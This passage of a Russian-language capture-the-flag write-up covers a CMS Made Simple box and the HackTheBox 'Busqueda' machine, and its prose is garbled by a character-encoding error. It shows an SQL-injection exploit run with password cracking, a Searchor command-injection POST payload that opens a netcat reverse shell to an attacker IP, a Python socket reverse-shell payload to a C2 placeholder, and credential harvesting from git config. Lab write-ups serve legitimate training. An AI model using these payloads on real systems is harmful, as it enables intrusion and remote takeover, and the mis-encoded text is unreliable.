–ò–∑ –ø–µ—Ä–≤–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ —É –Ω–∞—Å –µ—Å—Ç—å CVE –æ—Ç MITRE. –≠—Ç–æ –æ—Ç–≤–µ—Ç –Ω–∞ **–≤–æ–ø—Ä–æ—Å 3** . –ï—Å–ª–∏ –º—ã –Ω–∞–∂–º–µ–º –Ω–∞ —Å—Å—ã–ª–∫—É, –º—ã —É–≤–∏–¥–∏–º –±–æ–ª—å—à–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —ç—Ç–æ–º CVE. –û–ø–∏—Å–∞–Ω–∏–µ –¥–∞–µ—Ç –Ω–∞–º –æ—Ç–≤–µ—Ç –Ω–∞ **–≤–æ–ø—Ä–æ—Å 4** .

![[Pasted image 20230711155445.png]]

–ü–æ–¥—ã—Ç–æ–∂–∏–º, —á—Ç–æ –∏–º–µ–µ–º. –ú—ã –∑–Ω–∞–µ–º, —á—Ç–æ –¥–ª—è CMS Made Simple 2.2.8 —Å—É—â–µ—Å—Ç–≤—É–µ—Ç —ç–∫—Å–ø–ª–æ–π—Ç –∏ —á—Ç–æ —É ¬´mitch¬ª –µ—Å—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å. –ù–æ —É –Ω–∞—Å –Ω–µ—Ç –µ–≥–æ –ø–∞—Ä–æ–ª—è‚Ä¶ –ø–æ–∫–∞ üòè

–ï—â—ë –≤ –Ω–∞—à–∏—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞—Ö –º—ã –≤–∏–¥–∏–º —Å—Ç—Ä–∞–Ω–∏—Ü—É Exploit-DB, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –Ω–∞—à–µ–º—É –∑–∞–ø—Ä–æ—Å—É –∏ –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ –∞—Ç–∞–∫–µ —Å –≤–Ω–µ–¥—Ä–µ–Ω–∏–µ–º SQL —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º CVE-2019‚Äì9053.

![[Pasted image 20230711161713.png]]

**3. –ö–∞–∫–æ–π CVE –≤—ã –∏—Å–ø–æ–ª—å–∑—É–µ—Ç–µ –ø—Ä–æ—Ç–∏–≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è?**

_CVE-2019-9053_

**4. –ö –∫–∞–∫–æ–π —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —É—è–∑–≤–∏–º–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ?**

_SQLi_

## –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è

–¢–µ–ø–µ—Ä—å –º—ã –∑–Ω–∞–µ–º –ø–æ—Ä—Ç—ã, –æ—Ç–∫—Ä—ã—Ç—ã–µ –Ω–∞ —Ü–µ–ª–∏, –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –æ —Ç–æ–º, —á—Ç–æ —Ü–µ–ª—å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –Ω–∞ —Å–≤–æ–µ–º –≤–µ–±-—Å–∞–π—Ç–µ, –∏ –≤–æ–∑–º–æ–∂–Ω—ã–π —ç–∫—Å–ø–ª–æ–π—Ç, –∫–æ—Ç–æ—Ä—ã–π –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å.

–ú—ã –∑–∞–ø—É—Å—Ç–∏–ª–∏ pip –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –ø—Ä–µ–¥–≤–∞—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö —É—Å–ª–æ–≤–∏–π, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã—Ö –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —ç—Ç–æ–≥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —ç–∫—Å–ø–ª–æ–π—Ç–∞. –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –º—ã. –ó–∞–ø—É—Å—Ç–∏—Ç–µ —ç–∫—Å–ø–ª–æ–π—Ç –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, —É–∫–∞–∑—ã–≤–∞—é—â–µ–≥–æ URL —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω—ã. –î–∞–ª–µ–µ —Å–ª–µ–¥—É–µ—Ç ‚Äìcrack. –ò -w —Å –ø—É—Ç–µ–º –∫ —Å–ø–∏—Å–∫—É —Å–ª–æ–≤ rockyou.txt.

```
python 46635.py -u http://10.10.146.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20230711162733.png]]

–ü–æ—Å–ª–µ –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—è –∫–∞–∂–¥–æ–≥–æ —Å–∏–º–≤–æ–ª–∞ —Å —Ä–∞–∑–ª–∏—á–Ω—ã–º–∏ —Ç–∏–ø–∞–º–∏ –∑–∞–ø–∏—Å–µ–π, —Ç–∞–∫–∏–º–∏ –∫–∞–∫ —Å–æ–ª—å, –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∞–¥—Ä–µ—Å —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã, –ø–∞—Ä–æ–ª—å –∏ —Ç. –¥., –º—ã —Å–º–æ–≥–ª–∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å –ø–∞—Ä–æ–ª—å –∫–∞–∫ —Å–µ–∫—Ä–µ—Ç–Ω—ã–π.

![[Pasted image 20230711162758.png]]

–ò—Å–ø–æ–ª—å–∑—É—è –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –ø–∞—Ä–æ–ª—å, –∫–æ—Ç–æ—Ä—ã–µ –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏, –º—ã —Ç–µ–ø–µ—Ä—å –º–æ–∂–µ–º –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ –ø–æ SSH.
–° –ø–æ–º–æ—â—å—é –ø–æ–¥—Å–∫–∞–∑–∫–∏, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–π –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–π –ø—Ä–æ–±–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ–π Hackney, –º—ã —Å–º–æ–≥–ª–∏ –≤—ã—è—Å–Ω–∏—Ç—å, —á—Ç–æ —Å–ª—É–∂–±–∞, —Ä–∞–±–æ—Ç–∞—é—â–∞—è –Ω–∞ –ø–æ—Ä—Ç—É, —Ç–æ–∂–µ –±—ã–ª–∞ —Å–ª—É–∂–±–æ–π SSH —Å –ø–æ–º–æ—â—å—é –Ω–µ–¥–∞–≤–Ω–æ –∏–∑–≤–ª–µ—á–µ–Ω–Ω—ã—Ö —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –ø–∞—Ç—á–∞, –º—ã —Å–º–æ–≥–ª–∏ . –í–æ–π–¥–∏—Ç–µ –≤ —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —á–µ—Ä–µ–∑ SSH. –ü—Ä–∏ –≤—Ö–æ–¥–µ –≤ —Å–∏—Å—Ç–µ–º—É –º—ã –ø–æ–ø—ã—Ç–∞–ª–∏—Å—å –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ç–µ–∫—É—â–µ–≥–æ –∫–∞—Ç–∞–ª–æ–≥–∞ –∏ –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏ —Ñ–ª–∞–≥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π —Ç–æ—á–∫–∏ TXT. –ù–∞ –º–∞—à–∏–Ω–µ.

```bash
ssh mitch@10.10.146.189 -p 2222
ls
cat user.txt
```

![[Pasted image 20230711162905.png]]

![[Pasted image 20230711163005.png]]

–î–∞–ª–µ–µ –¥–∞–≤–∞–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∏–º, –µ—Å—Ç—å –ª–∏ —É –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–æ–º–∞—à–Ω–∏–µ –∫–∞—Ç–∞–ª–æ–≥–∏.

![[Pasted image 20230711163226.png]]

## –ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

–ù–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—É—é —ç—Å–∫–∞–ª–∞—Ü–∏—é! –°–Ω–∞—á–∞–ª–∞ —è –ø—Ä–µ–¥–ø–æ—á–∏—Ç–∞—é –∑–∞–ø—É—Å–∫–∞—Ç—å ¬´sudo -l¬ª, —á—Ç–æ–±—ã –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å, —á—Ç–æ –º–æ–∂–µ—Ç –∑–∞–ø—É—Å—Ç–∏—Ç—å –º–æ–π —Ç–µ–∫—É—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.

![[Pasted image 20230711163329.png]]

–ú—ã –≤–∏–¥–∏–º, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ¬´mitch¬ª –º–æ–∂–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å /usr/bin/vim –±–µ–∑ –ø–∞—Ä–æ–ª—è. –ò–º–µ—è —ç—Ç—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, –¥–∞–≤–∞–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∏–º GTFOBins –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —Å–º–æ–∂–µ–º –ª–∏ –º—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ –¥–ª—è privesc.

![[Pasted image 20230711163509.png]]

–ü–æ—Ö–æ–∂–µ, –µ—Å–ª–∏ –º—ã –∑–∞–ø—É—Å—Ç–∏–º —ç—Ç—É –∫–æ–º–∞–Ω–¥—É, –º—ã —Å–º–æ–∂–µ–º –ø–æ–≤—ã—Å–∏—Ç—å –Ω–∞—à–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏!

![[Pasted image 20230711163543.png]]

–≠—Ç–æ —Å—Ä–∞–±–æ—Ç–∞–ª–æ! –û—Ç—Å—é–¥–∞ –≤—Å–µ, —á—Ç–æ –Ω–∞–º –æ—Å—Ç–∞–ª–æ—Å—å, —ç—Ç–æ –≤–∑—è—Ç—å –∫–æ—Ä–Ω–µ–≤–æ–π —Ñ–ª–∞–≥, –∏ –∫–æ–º–Ω–∞—Ç–∞ –≥–æ—Ç–æ–≤–∞.

![[Pasted image 20230711163607.png]]

![[Pasted image 20230711163616.png]]

---
# Busqueda

**–ü–ª–æ—à–∞–¥–∫–∞:** https://hackthebox.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy
**–ó–∞–¥–∞—á–∞:** –ù–∞–π—Ç–∏ —Ñ–∞–π–ª—ã **user.txt** –∏ **root.txt** –Ω–∞ –º–∞—à–∏–Ω–µ –∂–µ—Ä—Ç–≤—ã.


–ü—Ä–µ–∂–¥–µ –≤—Å–µ–≥–æ –Ω–∞–º –Ω—É–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –≤ —Ñ–∞–π–ª ¬´/etc/hosts¬ª –∏–º—è –º–∞—à–∏–Ω—ã:

```
10.10.11.208 searcher.htb searcher
```

## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ

–≤—ã–ø–æ–ª–Ω–∏–º —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å –ø–æ–º–æ—â—å—é Nmap:

```
sudo nmap -sT -n -Pn -sV -T4 -vv 10.10.11.208
```

nmap –¥–∞—ë—Ç –Ω–∞–º –≤–æ—Ç —Ç–∞–∫–æ–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

–ú—ã –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏ HTTP-—Å–µ—Ä–≤–µ—Ä (–ø–æ—Ä—Ç: 80):

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
```

–ü–æ—Å–∫–æ–ª—å–∫—É —É –Ω–∞—Å –Ω–µ—Ç –∫–ª—é—á–∞ –æ—Ç ssh, –Ω–∞–º –±–æ–ª—å—à–µ –Ω–µ—á–µ–≥–æ –Ω–µ –æ—Ç—Å–∞—ë—Ç—Å—è, –ø–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å—Ç—Ä–∞–Ω–∏—Ü–µ

![[Pasted image 20230708072421.png]]

–í–Ω–∏–º–∞—Ç–µ–ª—å–Ω–æ –ø–æ—Å–º–∞—Ç—Ä–∏—Ç–µ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É, –Ω–µ—á–µ–≥–æ –Ω–µ –Ω–∞—Ö–æ–¥–∏—Ç–µ?

![[Pasted image 20230708073011.png]]

–î–∞, –¥–∞–∂–µ –æ–±–æ—à–ª–∏—Å—å –±–µ–∑ –∏—Å—Ö–æ–¥–Ω–∏–∫–∞, —Ö–æ—Ç—è –µ—Å–ª–∏ —Ç—É–¥–∞ –∑–∞–≥–ª—è–Ω–µ–º:

![[Pasted image 20230708073240.png]]

–ü—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–∏—Å–∫–∞ –æ–Ω –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ ¬´–¥–≤–∏–∂–æ–∫¬ª –∏ ¬´–∑–∞–ø—Ä–æ—Å¬ª; –∏ —è –ø–æ—Ä–¥—É–º–∞–ª —á—Ç–æ —ç—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å SSTI.

–ò–∑ —ç—Ç–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –Ω–∏–∂–Ω–µ–≥–æ –∫–æ–ª–æ–Ω—Ç–∏—Ç—É–ª–∞ –º—ã –Ω–∞—Ö–æ–¥–∏–º –∏—Å–ø–æ–ª—å–∑—É–µ–º—É—é –≤–µ—Ä—Å–∏—é ¬´Searchor¬ª (2.4.0).

–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –¥–∞–µ—Ç –Ω–∞–º –æ—Ç–ª–∏—á–Ω—É—é —Ç–æ—á–∫—É –¥–ª—è –Ω–∞—á–∞–ª–∞. –ú—ã –∑–Ω–∞–µ–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü–∞, –∞ —Ç–∞–∫–∂–µ –ø—Ä–æ–≤–µ—Ä—è–µ–º –≤–µ—Ä—Å–∏—é —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–∏. –ù–∞–º –Ω—É–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –µ—Å—Ç—å –ª–∏ —É—è–∑–≤–∏–º–æ—Å—Ç–∏.


## –ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

–ù–µ–º–Ω–æ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ —Ä–∞–∑–ª–∏—á–Ω—ã–µ –ø–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏ SSTI –Ω–æ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–æ, –ø–æ–∏—Å–∞–≤ –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –º—ã –ø–æ–Ω—è–ª–∏ —á—Ç–æ —É  ¬´Searchor¬ª (2.4.0) –µ—Å—Ç—å —É—è–∑–≤–∏–º–æ—Å—Ç—å. –ü–æ—Å–ª–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–π —è –æ–±–Ω–∞—Ä—É–∂–∏–ª, —á—Ç–æ —ç—Ç–∞ –≤–µ—Ä—Å–∏—è Searchor –∏–º–µ–µ—Ç –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞.

![[Pasted image 20230708111807.png]]


## –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è 

–ú—ã –º–æ–∂–µ–º –ø–æ —Ä–∞–∑–Ω–æ–º—É —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å –∏ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –æ–±–æ–ª–æ—á–∫–µ. –ú—ã –º–æ–∂–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–æ—Ç —Ç–∞–∫–æ–π POST-–∑–∞–ø—Ä–æ—Å—å:

```
engine=Accuweather&query=example'),__import__('os').system('busybox nc 10.10.16.15 4444 -e /bin/sh')#
```

–ö–æ–Ω–µ—á–Ω–æ –∂–µ —É–∫–∞–∂–µ–º —Å–≤–æ–π IP-–∞–¥—Ä–µ—Å, –∏ –ø—Ä–µ–∂–¥–µ –≤—Å–µ–≥–æ –∑–∞–ø—É—Å—Ç–∏–º –∫–æ–º–∞–Ω–¥—É:

```
nc -nvlp 4444
```

–ó–∞–ø—Ä–æ—Å—å –∫–∏–¥–∞–π—Ç–µ –∫–∞–∫ —É–≥–æ–¥–Ω–æ –Ω–µ –≤–∞–∂–Ω–æ. –ú–æ–∂–Ω–æ –Ω–∞–ø—Ä—è–º—É—é (`'),__import__('os').system('busybox nc 10.10.16.15 4444 -e /bin/sh')#`),
–∏–ª–∏ burp –∏ –¥–∞–∂–µ –ø–∞–Ω–µ–ª—å —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ –≤ –±—Ä–∞–≤–∑–µ—Ä–µ.

![[Pasted image 20230708111301.png]]

–ï—Å–ª–∏ –ø—Ä–æ—Å–º–æ—Ç—Ä–∏–º —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è GitHub jonnyzar ' [POC-Searchor-2.4.2](https://github.com/jonnyzar/POC-Searchor-2.4.2) '.

![[Pasted image 20230708111901.png]]

–≠—Ç–æ –æ—Ç–º–µ—á–∞–µ—Ç, —á—Ç–æ —ç—Ç–æ—Ç —ç–∫—Å–ø–ª–æ–π—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –¥–ª—è ¬´Searchor¬ª <= 2.4.2 –∏ 2.4.0. –û–Ω —Ç–∞–∫–∂–µ –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç –∫–æ–¥ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è RCE, —É–¥–æ–±–Ω–æ.


```Python
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('<C2-ipv4>',<C2-port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

–ö–æ–¥ –≤—ã—à–µ –≤–µ—Ä–Ω–µ—Ç –Ω–∞–º –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É. 

–ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä—É–≥–æ–π –ø–æ–¥—Ö–æ–¥:

```python
__import__('os').system('<CMD>')
__import__('os').popen('<CMD>').read()
```

![[Pasted image 20230708113753.png]]

![[Pasted image 20230708113800.png]]

![[Pasted image 20230708115729.png]]

![[Pasted image 20230708113446.png]]

–¢–∞–∫–∂–µ –≤ github –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –∫–æ–¥—ã –∏ —Å–∫—Ä–∏–ø—Ç—ã –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç —ç—Ç–æ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç—å —á—Ç–æ–±—ã –æ–±–ª–µ–≥—á–∏—Ç—å –∑–∞–¥–∞—á—É –º–æ–∂–Ω–æ —Å–∏–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∏—Ö.

–ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏–µ –æ–±—Ä–∞—Ç–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ –Ω—É–∂–Ω–æ –Ω–∞–π—Ç–∏ —Ñ–ª–∞–≥–∏. –ù–∞—à –ø–µ—Ä–≤—ã–π —Ñ–ª–∞–≥ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Ñ–∞–π–ª–µ user.txt –ø—É—Ç—å –∫–æ—Ç–æ—Ä—ã–π /home/svc/user.txt:

```bash
$ whoami
svc
$ cat /home/svc/user.txt
2ac1b522ea7b5f6e443883d742d27d31
```


## –ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

–î–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ—á–∏—Å–ª–∏–º –∫–∞—Ç–æ–ª–æ–≥–∏

![[Pasted image 20230708123423.png]]

–ó–¥–µ—Å—å —è –º–∞–ª–æ —á—Ç–æ –ø–æ–ª—É—á–∏–ª, –Ω–æ —è –æ–±–Ω–∞—Ä—É–∂–∏–ª —Å–∫—Ä—ã—Ç—ã–π —Ñ–∞–π–ª –≤ –º–æ–µ–º –¥–æ–º–∞—à–Ω–µ–º –∫–∞—Ç–∞–ª–æ–≥–µ –¥–ª—è git. –ù–∞ —ç—Ç–æ–º —ç—Ç–∞–ø–µ –≤–∞—à–∞ —Ä–µ—Ñ–ª–µ–∫—Å–∏–≤–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ ls –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å ls -al, —á—Ç–æ–±—ã –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å —ç—Ç–∏ —Å–∫—Ä—ã—Ç—ã–µ –∫–∞—Ç–∞–ª–æ–≥–∏. –í –ø–∞–ø–∫–µ /var/www/app –≤–≤–µ–¥—ë–º –∫–æ–º–∞–Ω–¥—É ls -al:

![[Pasted image 20230708123516.png]]

–í –∫–∞—Ç–∞–ª–æ–≥–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π `/var/www/app` E—Å—Ç—å `.git` –∫–∞—Ç–∞–ª–æ–≥ –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è. 

–º—ã –ø–æ–ª—É—á–∏–ª–∏ –Ω–µ–∫–æ—Ç–æ—Ä—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö –∏ —Ñ–∞–π–ª–∞—Ö –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏.

```
git log
```

![[Pasted image 20230708123806.png]]

—É –Ω–∞—Å –µ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å –∏–º–µ–Ω–µ–º **–∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä** –∏ —Å—É–±–¥–æ–º–µ–Ω **gitea.searcher.htb** 

–ï—Å–ª–∏ –ø–æ –∫–∞–∫–∏–º —Ç–æ –ø—Ä–∏—á–∏–Ω–∞–º —É –≤–∞—Å —ç—Ç–æ –∫–æ–º–∞–Ω–¥–∞ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª, —Ç–æ –º–æ–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤—Ä—É—á–Ω—É:

```
cat .git/HEAD
cat .git/logs/HEAD
cat .git/logs/refs/heads
```

–§–∞–π–ª—ã –ª–æ–≥–æ–≤ git –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –ø–∞–ø–∫–µ .git –≤–Ω—É—Ç—Ä–∏ –∫–æ—Ä–Ω–µ–≤–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –≤–∞—à–µ–≥–æ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è. –û–Ω –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è logs –∏ —Å–æ–¥–µ—Ä–∂–∏—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ñ–∞–π–ª—ã –∂—É—Ä–Ω–∞–ª–æ–≤, –≤–∫–ª—é—á–∞—è reflog, HEAD, –∏ –ª–æ–≥–∏ –¥–ª—è –∫–∞–∂–¥–æ–π –≤–µ—Ç–∫–∏ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è.

–î–∞–≤–∞–π—Ç–µ –∑–∞–≥–ª—è–Ω–∏–º —Ñ–∞–π–ª –∫–æ–Ω—Ñ–∏–≥:

```
git config -l
```

![[Pasted image 20230708150435.png]]

–ò–ª–∏ –∂–µ –≤ —Ä—É—á–Ω—É—é:

```
cat .git/config
```

![[Pasted image 20230708125809.png]]

–£ –Ω–∞—Å –µ—Å—Ç—å –µ—â–µ –æ–¥–∏–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø–æ –∏–º–µ–Ω–∏ **Cody** –∏ –µ–≥–æ –ø–∞—Ä–æ–ª—å –Ω–∞ **–ø–æ–¥–¥–æ–º–µ–Ω–µ @gitea.searcher.htb**

–ü–µ—Ä–µ—Ö–æ–¥–∏–º –ø–æ —ç—Ç–æ–º—É –¥–æ–º–µ–Ω—É, –Ω–æ —Å–Ω–∞—á–∞–ª–æ –Ω—É–∂–Ω–æ –µ–≥–æ –≤–∫–ª—é—á–∏—Ç—å –≤ —Å–ø–∏—Å–æ–∫–µ —Ö–æ—Å—Ç–æ–≤. –û—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä—É–π—Ç–µ —Ñ–∞–π–ª /etc/hosts –∏ –¥–æ–±–∞–≤—å—Ç–µ —Å—É–±–¥–æ–º–µ–Ω –≤ —Ñ–∞–π–ª.

![[Pasted image 20230708151207.png]]

–í–æ–π—Ç–∏ —Å —É—á–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ Cody –Ω–∞ —Å–∞–π—Ç.

![[Pasted image 20230708151243.png]]

–ú—ã –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–ª—É—á–∏–ª–∏ –æ—Ç —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏, –Ω–æ –ø–∞—Ä–æ–ª—å, –∫–æ—Ç–æ—Ä—ã–π –º—ã –Ω–∞—à–ª–∏ –¥–ª—è –ö–æ–¥–∏, –ø–æ–≤—Ç–æ—Ä–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ svc —Ç–æ–π –∂–µ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏, –¥–ª—è –∫–æ—Ç–æ—Ä–æ–π –º—ã –ø–æ–ª—É—á–∏–ª–∏ Shell. –î—Ä—É–≥–∏–º–∏ —Å–ª–æ–≤–∞–º–∏, —è —Ä–µ—à–∏–ª –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —ç—Ç–æ –Ω–∞ sudo –¥–ª—è —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ svc, –∫ –∫–æ—Ç–æ—Ä–æ–π —É –º–µ–Ω—è –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤ —Å–∏—Å—Ç–µ–º–µ –Ω–µ—Ç 